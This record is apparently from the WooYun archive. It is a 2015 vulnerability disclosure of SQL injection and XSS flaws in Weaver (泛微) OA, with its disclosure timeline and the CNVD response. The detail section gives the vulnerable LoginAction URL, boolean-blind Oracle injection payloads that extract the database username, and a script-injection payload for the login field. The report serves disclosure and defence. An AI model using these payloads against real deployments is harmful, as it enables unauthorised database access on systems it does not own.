{"id": 67743, "wybug_id": "wooyun-2015-0132258", "wybug_title": "泛微OA系统存在SQL注入漏洞（附测试脚本）", "wybug_corp": "泛微OA", "wybug_author": "浮萍", "wybug_date": "2015-08-09 11:47", "wybug_open_date": "2015-11-09 11:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-11：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向公众公开  简要描述： SQL注入xss 详细说明：  oracle boolean盲注以官方为例：\nhttp://**.**.**.**:9085/ServiceAction/com.eweaver.base.security.servlet.LoginAction?action=getLabelNameByKeyId&keywordid=402881e43c2385f6013c2385f6720002&language=zh_CN&labelParams=\n正常页面 提示请输入用户名\n\n输入' and 'a'='a  提示请输入用户名\n\n输入' and 'a'='b  提示undefined\n\n根据length(SYS_CONTEXT('USERENV','CURRENT_USER')) 猜当前用户的长度当值为14时返回请输入用户名说明长度为14\n\n然后跑名字\nand ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),N,1))>X其中N为第几位字母，X为字母对应的ascii码值\n\n\n最后获取名字为EWEAVERINHOUSE   漏洞证明：  可结合http://**.**.**.**/bugs/wooyun-2015-0124027和http://**.**.**.**/bugs/wooyun-2015-0124589来 验证案例：\nhttp://**.**.**.**/ServiceAction/com.eweaver.base.security.servlet.LoginAction?action=getLabelNameByKeyId&keywordid=402881e43c2385f6013c2385f6720002' and length(SYS_CONTEXT('USERENV','CURRENT_USER'))=7 and 'a'='a&language=zh_CN&labelParams=\n长度为7\n\n\nOracle user is EWEAVER\n\n\n---------\nhttp://**.**.**.**/ServiceAction/com.eweaver.base.security.servlet.LoginAction?action=getLabelNameByKeyId&keywordid=402881e43c2385f6013c2385f6720002' and length(SYS_CONTEXT('USERENV','CURRENT_USER'))=7 and 'a'='a&language=zh_CN&labelParams=\n长度为7\n\n\n\n\n\n\n\n-----------XSS\n1'\"()&%<ScRiPt >prompt(930551)</ScRiPt>\n在登录的输入框处\n\n\n\n\n\n其他就不再测试   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-11 11:55 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}